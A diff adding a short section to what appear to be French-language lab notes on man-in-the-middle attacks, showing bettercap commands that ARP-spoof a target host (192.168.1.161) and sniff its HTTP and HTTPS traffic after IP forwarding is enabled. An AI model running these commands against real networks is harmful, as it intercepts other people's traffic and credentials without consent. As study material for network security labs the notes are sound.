@@ -681,6 +681,24 @@ sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 
 ==> Le trafic doit fonctionner correctement même si tout passe par la machine attaquante
 
+### d. with bettercap
+
+````
+net.probe on
+net.show
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.161
+arp.spoof on // show : arp spoofer started, probing 1 targets
+set net.sniff.local true
+net.sniff on
+````
+````
+events.ignore net.sniff.upnp
+events.ignore net.sniff.mdns
+events.ignore net.sniff.dns
+````
+nous on veut que net.sniff.https et http
+
 
 
 
